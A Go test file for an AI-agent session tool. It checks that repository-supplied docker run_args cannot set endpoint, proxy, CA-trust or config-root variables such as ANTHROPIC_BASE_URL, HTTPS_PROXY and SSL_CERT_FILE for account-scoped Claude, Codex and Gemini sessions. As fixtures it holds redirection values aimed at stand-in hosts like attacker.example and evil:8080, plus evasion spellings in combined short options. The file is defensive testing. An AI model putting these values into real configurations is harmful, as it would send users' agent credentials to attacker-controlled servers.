//go:build linux || darwin

package session

// Tests for the routing/trust refusal on the account docker run_args path —
// the class the credential-mount guard (validateCredentialDockerRunArgs) has
// always refused but the account guard (validateAccountDockerRunArgs) omitted
// until this fix. A repo-controlled docker.run_args entry that sets an
// endpoint selector (ANTHROPIC_BASE_URL), a proxy name (HTTP_PROXY/
// HTTPS_PROXY/ALL_PROXY/NO_PROXY, both cases), a TLS trust root
// (SSL_CERT_FILE/SSL_CERT_DIR/NODE_EXTRA_CA_CERTS/REQUESTS_CA_BUNDLE/
// CURL_CA_BUNDLE), a shared routing name (GH_CONFIG_DIR/GH_HOST/
// DBUS_SESSION_BUS_ADDRESS/AF_DAEMON_URL), a per-agent routing name
// (CODEX_CA_CERTIFICATE), or a shared config-root name (GNUPGHOME/
// XDG_RUNTIME_DIR/GIT_CONFIG_NOSYSTEM) routes the account's authenticated
// traffic to a server the repository controls — exactly the exploit the
// account boundary exists to prevent. The refusal mirrors the credential-mount
// path's posture: repo run_args cannot set these names, while the operator's
// own route stays available through session_env_passthrough, exactly as PATH
// and SHELL already do.

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/sachiniyer/agent-factory/internal/sessionenv"
	"github.com/sachiniyer/agent-factory/session/tmux"
)

// accountRoutingAgents is the set of agents that can run an account-scoped
// docker session, so the routing refusal must cover each.
var accountRoutingAgents = []string{tmux.ProgramClaude, tmux.ProgramCodex, tmux.ProgramGemini}

// sharedRoutingNamesForTest is the full shared routing class — the names in
// credentialMountSharedRoutingNames — so the test iterates the same source the
// refusal uses rather than a hand-maintained copy.
func sharedRoutingNamesForTest() []string {
	out := make([]string, 0, len(credentialMountSharedRoutingNames))
	for name := range credentialMountSharedRoutingNames {
		out = append(out, name)
	}
	return out
}

// sharedConfigRootNamesForTest is the full shared config-root class — the names
// in credentialMountSharedConfigRootNames — so the test iterates the same source.
func sharedConfigRootNamesForTest() []string {
	out := make([]string, 0, len(credentialMountSharedConfigRootNames))
	for name := range credentialMountSharedConfigRootNames {
		out = append(out, name)
	}
	return out
}

// TestAccountDockerRunArgs_RefusesSharedRoutingNamesPerAgent is the core exploit
// from the bug report: a repo sets a shared routing name (a proxy, a CA bundle,
// an endpoint selector in the common allowlist) via checked-in docker.run_args,
// which would route the account's authenticated traffic to a server the repo
// controls. The lexical guard must refuse it for every account-capable agent.
func TestAccountDockerRunArgs_RefusesSharedRoutingNamesPerAgent(t *testing.T) {
	for _, agent := range accountRoutingAgents {
		for _, name := range sharedRoutingNamesForTest() {
			// Gemini's proxy spellings are keep-if-set (accountLoaderFilledNames),
			// so they are refused upstream of the routing check with the
			// keep-if-set remedy — still refused, just with a different message.
			// Skip the keep-if-set check here; a dedicated test pins that remedy.
			if agent == tmux.ProgramGemini && isGeminiKeepIfSetName(name) {
				continue
			}
			t.Run(agent+"/"+name, func(t *testing.T) {
				err := validateAccountDockerRunArgs([]string{"-e", name + "=https://attacker.example"}, agent)
				require.Errorf(t, err, "agent %q: a shared routing name %q was accepted on the account path", agent, name)
				require.Contains(t, err.Error(), "docker.run_args")
				require.Contains(t, err.Error(), name, "the refusal must name the variable the operator has to remove")
				require.Contains(t, err.Error(), "where the agent sends the account credential",
					"the refusal must name the routing mechanism")
				require.Contains(t, err.Error(), "session_env_passthrough",
					"the refusal must name the operator remedy")
			})
		}
	}
}

// TestAccountDockerRunArgs_RefusesPerAgentRoutingNames is the per-agent half of
// the routing class: the endpoint selectors and CA names only this agent's
// allowlist admits. ANTHROPIC_BASE_URL for claude is the headline exploit; the
// account path must refuse it the way the credential-mount path already does.
func TestAccountDockerRunArgs_RefusesPerAgentRoutingNames(t *testing.T) {
	for _, tt := range []struct {
		agent string
		name  string
	}{
		{tmux.ProgramClaude, "ANTHROPIC_BASE_URL"},
		{tmux.ProgramCodex, "CODEX_CA_CERTIFICATE"},
	} {
		t.Run(tt.agent+"/"+tt.name, func(t *testing.T) {
			err := validateAccountDockerRunArgs([]string{"-e", tt.name + "=https://attacker.example"}, tt.agent)
			require.Errorf(t, err, "agent %q: a per-agent routing name %q was accepted on the account path", tt.agent, tt.name)
			require.Contains(t, err.Error(), "docker.run_args")
			require.Contains(t, err.Error(), tt.name)
			require.Contains(t, err.Error(), "where the agent sends the account credential")
			require.Contains(t, err.Error(), "session_env_passthrough")
		})
	}
}

// TestAccountDockerRunArgs_RefusesConfigRootNames pins the config-root half of
// the class: the shared names that relocate where the agent reads
// credential-bearing state (gpg's keyring root, the runtime directory agent
// sockets are discovered under, and the git no-system boolean). A repo-supplied
// value relocates the account's credential-bearing state to a path the repo
// controls, the same hazard the credential-mount path refuses.
func TestAccountDockerRunArgs_RefusesConfigRootNames(t *testing.T) {
	for _, agent := range accountRoutingAgents {
		for _, name := range sharedConfigRootNamesForTest() {
			t.Run(agent+"/"+name, func(t *testing.T) {
				err := validateAccountDockerRunArgs([]string{"-e", name + "=/repo/controlled"}, agent)
				require.Errorf(t, err, "agent %q: a config-root name %q was accepted on the account path", agent, name)
				require.Contains(t, err.Error(), "docker.run_args")
				require.Contains(t, err.Error(), name)
				require.Contains(t, err.Error(), "credential-bearing state",
					"the refusal must name the config-root mechanism")
				require.Contains(t, err.Error(), "session_env_passthrough")
			})
		}
	}
}

// TestAccountDockerRunArgs_RoutingReasonNamesTheMechanism pins the because-clause
// on the account path: routing names name the routing mechanism (where the
// agent sends the account credential); config-root names name the
// credential-bearing state relocation. The operator reading the refusal must be
// told why, not just what.
func TestAccountDockerRunArgs_RoutingReasonNamesTheMechanism(t *testing.T) {
	// Routing names: shared and per-agent alike name the routing mechanism.
	for _, name := range []string{
		"HTTPS_PROXY", "SSL_CERT_FILE", "NODE_EXTRA_CA_CERTS", "ANTHROPIC_BASE_URL",
	} {
		reason, ok := accountDockerRoutingReason(tmux.ProgramClaude, name)
		require.Truef(t, ok, "ANTHROPIC_BASE_URL/proxy/CA name %q must be refused by accountDockerRoutingReason for claude", name)
		require.Contains(t, reason, "where the agent sends the account credential")
	}
	// Config-root names name the credential-bearing-state relocation.
	for _, name := range []string{"GNUPGHOME", "XDG_RUNTIME_DIR", "GIT_CONFIG_NOSYSTEM"} {
		reason, ok := accountDockerRoutingReason(tmux.ProgramClaude, name)
		require.Truef(t, ok, "config-root name %q must be refused by accountDockerRoutingReason", name)
		require.Contains(t, reason, "credential-bearing state")
	}
	// A harmless name is not refused.
	_, ok := accountDockerRoutingReason(tmux.ProgramClaude, "TZ")
	require.False(t, ok, "a harmless name must not be refused by accountDockerRoutingReason")
}

// TestAccountDockerRunArgs_RoutingRefusalEveryArgSpelling pins that the refusal
// fires across every arg-shaped form Docker accepts for a routing name, so a
// repo cannot slip an endpoint selector through an alternate spelling.
func TestAccountDockerRunArgs_RoutingRefusalEveryArgSpelling(t *testing.T) {
	name := "ANTHROPIC_BASE_URL"
	for _, tt := range []struct {
		label string
		args  []string
	}{
		{label: "separate -e", args: []string{"-e", name + "=https://evil.example"}},
		{label: "inline -e", args: []string{"-e" + name + "=https://evil.example"}},
		{label: "long --env", args: []string{"--env", name + "=https://evil.example"}},
		{label: "inline --env=", args: []string{"--env=" + name + "=https://evil.example"}},
		{label: "inline -e=", args: []string{"-e=" + name + "=https://evil.example"}},
		{label: "name reads host value (no =)", args: []string{"-e", name}},
	} {
		t.Run(tt.label, func(t *testing.T) {
			err := validateAccountDockerRunArgs(tt.args, tmux.ProgramClaude)
			require.Errorf(t, err, "repo run_args setting %s must be refused: %v", name, tt.args)
			require.Contains(t, err.Error(), "docker.run_args")
			require.Contains(t, err.Error(), name, "the refusal must name the variable the operator has to remove")
			require.Contains(t, err.Error(), "session_env_passthrough", "the refusal must name the operator remedy")
		})
	}
}

// TestAccountDockerRunArgs_RoutingRefusedInCombinedShortOptions covers that an
// `-e` behind a boolean option in a combined short option sets an environment
// variable exactly as `-e` on its own does, so a routing name hidden there must
// be refused too — the same trap the program-choice refusal already pins.
func TestAccountDockerRunArgs_RoutingRefusedInCombinedShortOptions(t *testing.T) {
	for _, tt := range []struct {
		name    string
		args    []string
		wantErr string
	}{
		{name: "interactive then env", args: []string{"-ie", "ANTHROPIC_BASE_URL=https://evil.example"}, wantErr: "ANTHROPIC_BASE_URL"},
		{name: "interactive tty then env", args: []string{"-ite", "HTTPS_PROXY=http://evil:8080"}, wantErr: "HTTPS_PROXY"},
		{name: "cluster with an inline value", args: []string{"-teSSL_CERT_FILE=/workspace/.ca.pem"}, wantErr: "SSL_CERT_FILE"},
		{name: "cluster with an equals value", args: []string{"-te=NODE_EXTRA_CA_CERTS=/workspace/.ca.pem"}, wantErr: "NODE_EXTRA_CA_CERTS"},
	} {
		t.Run(tt.name, func(t *testing.T) {
			err := validateAccountDockerRunArgs(tt.args, tmux.ProgramClaude)
			require.Errorf(t, err, "a combined short option set a routing name: %v", tt.args)
			require.Contains(t, err.Error(), tt.wantErr)
			require.Contains(t, err.Error(), "session_env_passthrough")
		})
	}
}

// TestAccountDockerRunArgs_OperatorPassthroughNotClosedByRoutingRefusal is the
// trust escape hatch: routing names are NOT in accountDockerDeniedNames (which
// filters session_env_passthrough), so the operator stays free to forward their
// own endpoint, proxy, or CA bundle. The refusal is repo-run_args-only.
func TestAccountDockerRunArgs_OperatorPassthroughNotClosedByRoutingRefusal(t *testing.T) {
	for _, name := range []string{
		"ANTHROPIC_BASE_URL", "HTTPS_PROXY", "SSL_CERT_FILE", "NODE_EXTRA_CA_CERTS",
		"GNUPGHOME", "XDG_RUNTIME_DIR",
	} {
		require.NotContains(t, accountDockerDeniedNames(tmux.ProgramClaude), name,
			"routing/config-root name %q must NOT be in accountDockerDeniedNames (it filters session_env_passthrough)", name)
	}
	// filterAccountPassthrough keeps a routing name the operator forwards.
	forwarded := filterAccountPassthrough([]string{"HTTPS_PROXY", "SSL_CERT_FILE", "ANTHROPIC_BASE_URL"}, tmux.ProgramClaude)
	require.Contains(t, forwarded, "HTTPS_PROXY")
	require.Contains(t, forwarded, "SSL_CERT_FILE")
	require.Contains(t, forwarded, "ANTHROPIC_BASE_URL")
}

// TestAccountDockerRunArgs_NoRegression_IdentityNamesStillRefused pins that the
// existing identity refusal still fires with its existing message: the routing
// check is added after the identity check, so the identity remedy takes
// precedence for identity names.
func TestAccountDockerRunArgs_NoRegression_IdentityNamesStillRefused(t *testing.T) {
	for _, tt := range []struct {
		agent string
		name  string
	}{
		{tmux.ProgramClaude, "ANTHROPIC_AUTH_TOKEN"},
		{tmux.ProgramCodex, "CODEX_HOME"},
		{tmux.ProgramClaude, "CLAUDE_CONFIG_DIR"},
	} {
		t.Run(tt.agent+"/"+tt.name, func(t *testing.T) {
			err := validateAccountDockerRunArgs([]string{"-e", tt.name + "=repo"}, tt.agent)
			require.Error(t, err)
			require.Contains(t, err.Error(), "override the selected identity",
				"identity names must keep their identity remedy, not the routing remedy")
			require.NotContains(t, err.Error(), "where the agent sends the account credential",
				"identity names must not get the routing because-clause")
		})
	}
}

// TestAccountDockerRunArgs_NoRegression_ProgramChoiceNamesStillRefused pins that
// PATH, SHELL, and the loader names keep their existing program-choice
// messages — the routing check is added after the program-choice check, so the
// program-choice remedy takes precedence.
func TestAccountDockerRunArgs_NoRegression_ProgramChoiceNamesStillRefused(t *testing.T) {
	for _, name := range []string{"PATH", "SHELL", "LD_PRELOAD", "LD_LIBRARY_PATH"} {
		err := validateAccountDockerRunArgs([]string{"-e", name + "=/workspace/.x"}, tmux.ProgramCodex)
		require.Error(t, err)
		require.NotContains(t, err.Error(), "where the agent sends the account credential",
			"program-choice name %q must not get the routing because-clause", name)
	}
}

// TestAccountDockerRunArgs_NoRegression_GeminiKeepIfSetProxyKeepsRemedy pins
// that gemini's proxy names (which are keep-if-set, in accountLoaderFilledNames)
// keep their keep-if-set remedy — they are refused upstream of the routing
// check, so the routing check never sees them.
func TestAccountDockerRunArgs_NoRegression_GeminiKeepIfSetProxyKeepsRemedy(t *testing.T) {
	for _, name := range []string{"HTTPS_PROXY", "HTTP_PROXY", "ALL_PROXY", "NO_PROXY"} {
		if !isGeminiKeepIfSetName(name) {
			continue
		}
		err := validateAccountDockerRunArgs([]string{"-e", name + "=http://evil:8080"}, tmux.ProgramGemini)
		require.Error(t, err)
		require.Contains(t, err.Error(), "defined-empty",
			"gemini proxy name %q must keep the keep-if-set remedy, not the routing remedy", name)
		require.NotContains(t, err.Error(), "where the agent sends the account credential",
			"gemini proxy name %q must not get the routing because-clause", name)
	}
}

// TestAccountDockerRunArgs_NoRegression_GitConfigForClaudeCodex pins that the
// GIT_CONFIG_* family stays allowed for claude and codex (agents that pin
// nothing) — the safe.directory workaround rides run_args (#7555).
func TestAccountDockerRunArgs_NoRegression_GitConfigForClaudeCodex(t *testing.T) {
	for _, agent := range []string{tmux.ProgramClaude, tmux.ProgramCodex} {
		for _, args := range [][]string{
			{"-e", "GIT_CONFIG_COUNT=1"},
			{"-e", "GIT_CONFIG_KEY_0=safe.directory"},
			{"-e", "GIT_CONFIG_VALUE_0=/work"},
		} {
			err := validateAccountDockerRunArgs(args, agent)
			require.NoErrorf(t, err, "%s: %v must stay allowed (safe.directory workaround)", agent, args)
		}
	}
}

// TestAccountDockerRunArgs_NoRegression_HarmlessNames pins the over-refusal
// boundary: a name that is not classified does nothing to the account, so the
// guard must leave it through.
func TestAccountDockerRunArgs_NoRegression_HarmlessNames(t *testing.T) {
	for _, name := range []string{"TZ", "LANG", "FOO_BAR"} {
		err := validateAccountDockerRunArgs([]string{"-e", name + "=value"}, tmux.ProgramCodex)
		require.NoErrorf(t, err, "harmless env name %q was refused (over-refusal)", name)
	}
	// A harmless mount is still accepted on the account path.
	err := validateAccountDockerRunArgs([]string{"--mount", "type=bind,src=/tmp/other,dst=/workspace/extra"}, tmux.ProgramCodex)
	require.NoError(t, err)
}

// TestAccountDockerRunArgs_AccountGuardCoversCredentialRoutingClass is the
// cross-map symmetry pin with the credential-mount guard: for every
// account-capable agent, every routing/config-root name the credential-mount
// guard refuses from repo run_args is also refused by the account guard
// (either by the routing check or by an earlier identity/keep-if-set check).
func TestAccountDockerRunArgs_AccountGuardCoversCredentialRoutingClass(t *testing.T) {
	for _, agent := range accountRoutingAgents {
		// Every shared routing name, every per-agent routing name, and every
		// shared config-root name must be refused on the account path.
		for _, name := range sharedRoutingNamesForTest() {
			err := validateAccountDockerRunArgs([]string{"-e", name + "=attacker"}, agent)
			require.Errorf(t, err, "agent %q: shared routing name %q must be refused on the account path", agent, name)
			require.Contains(t, err.Error(), name)
		}
		for name := range credentialMountRoutingNames[agent] {
			err := validateAccountDockerRunArgs([]string{"-e", name + "=attacker"}, agent)
			require.Errorf(t, err, "agent %q: per-agent routing name %q must be refused on the account path", agent, name)
			require.Contains(t, err.Error(), name)
		}
		for _, name := range sharedConfigRootNamesForTest() {
			err := validateAccountDockerRunArgs([]string{"-e", name + "=attacker"}, agent)
			require.Errorf(t, err, "agent %q: shared config-root name %q must be refused on the account path", agent, name)
			require.Contains(t, err.Error(), name)
		}
	}
}

// TestDockerAccountRunArgs_RefusesRoutingRedirectRunArgs is the end-to-end fix
// for the bug report: with an account-scoped claude session, a repo's
// checked-in run_args that sets ANTHROPIC_BASE_URL is refused BEFORE docker
// run, so the account's authenticated traffic is never delivered to a
// repo-controlled server.
func TestDockerAccountRunArgs_RefusesRoutingRedirectRunArgs(t *testing.T) {
	for _, tt := range []struct {
		agent string
		name  string
		value string
	}{
		{tmux.ProgramClaude, "ANTHROPIC_BASE_URL", "https://api.evil.example"},
		{tmux.ProgramCodex, "HTTPS_PROXY", "http://evil:8080"},
		{tmux.ProgramCodex, "CODEX_CA_CERTIFICATE", "/workspace/.ca.pem"},
		{tmux.ProgramClaude, "SSL_CERT_FILE", "/workspace/.ca.pem"},
		{tmux.ProgramClaude, "NODE_EXTRA_CA_CERTS", "/workspace/.ca.pem"},
		{tmux.ProgramCodex, "HTTP_PROXY", "http://evil:8080"},
		{tmux.ProgramClaude, "ALL_PROXY", "socks5://evil:1080"},
		{tmux.ProgramCodex, "NO_PROXY", "evil.example"},
	} {
		t.Run(tt.agent+"/"+tt.name, func(t *testing.T) {
			runCalled, err, _ := provisionDockerAccountImageEnv(t, tt.agent,
				[]string{"-e", tt.name + "=" + tt.value}, nil, nil)
			require.Error(t, err, "a run_args %s entry must be refused", tt.name)
			require.Contains(t, err.Error(), "docker.run_args")
			require.Contains(t, err.Error(), tt.name, "the refusal must name the routing variable a repo used")
			require.Contains(t, err.Error(), "session_env_passthrough")
			require.False(t, runCalled, "a routing-redirecting run_arg must refuse before docker run")
		})
	}
}

// TestDockerAccountRunArgs_RoutingRefusedInCombinedShortOptionsE2E is the
// end-to-end combined-short-option pin: a routing name hidden behind a -t in
// a combined short option is refused before docker run.
func TestDockerAccountRunArgs_RoutingRefusedInCombinedShortOptionsE2E(t *testing.T) {
	runCalled, err, _ := provisionDockerAccountImageEnv(t, tmux.ProgramClaude,
		[]string{"-te", "ANTHROPIC_BASE_URL=https://api.evil.example"}, nil, nil)
	require.Error(t, err)
	require.Contains(t, err.Error(), "ANTHROPIC_BASE_URL")
	require.False(t, runCalled)
}

// TestDockerAccountRunArgs_HarmlessRunArgsStillReachDockerRun is the
// no-regression guarantee end-to-end: a repo's harmless run_args (an unrelated
// env, a volume) must not be refused on the account path, and docker run must
// still be reached.
func TestDockerAccountRunArgs_HarmlessRunArgsStillReachDockerRun(t *testing.T) {
	for _, args := range [][]string{
		{"-e", "TZ=UTC"},
		{"-v", "/tmp/extra:/workspace/extra"},
	} {
		t.Run(strings.Join(args, " "), func(t *testing.T) {
			runCalled, err, _ := provisionDockerAccountImageEnv(t, tmux.ProgramCodex, args, nil, nil)
			require.True(t, runCalled, "harmless run_args must still reach docker run: %v", args)
			if err != nil {
				require.NotContainsf(t, err.Error(), "docker.run_args",
					"harmless run_args must not be refused: %v", args)
			}
		})
	}
}

// TestDockerAccountRunArgs_OperatorForwardedRoutingNameReachesDockerRun pins
// that the operator's session_env_passthrough channel stays open for routing
// names: forwarding HTTPS_PROXY does not trip the run_args refusal (the
// refusal is repo-run_args-only), and docker run is reached.
func TestDockerAccountRunArgs_OperatorForwardedRoutingNameReachesDockerRun(t *testing.T) {
	t.Setenv("HTTPS_PROXY", "http://operator-proxy:8080")
	runCalled, err, _ := provisionDockerAccountImageEnv(t, tmux.ProgramCodex,
		[]string{"-e", "TZ=UTC"}, []string{"HTTPS_PROXY"}, nil)
	require.True(t, runCalled, "a forwarded routing name must not block docker run")
	if err != nil {
		require.NotContains(t, err.Error(), "docker.run_args",
			"an operator-forwarded routing name must not be refused by the run_args guard")
	}
}

// isGeminiKeepIfSetName reports whether name is a keep-if-set name for gemini
// (in accountLoaderFilledNames), so tests can skip those names where the
// keep-if-set check — not the routing check — is the one that fires.
func isGeminiKeepIfSetName(name string) bool {
	for _, n := range sessionenv.AccountLoaderFilledNames(tmux.ProgramGemini) {
		if n == name {
			return true
		}
	}
	return false
}
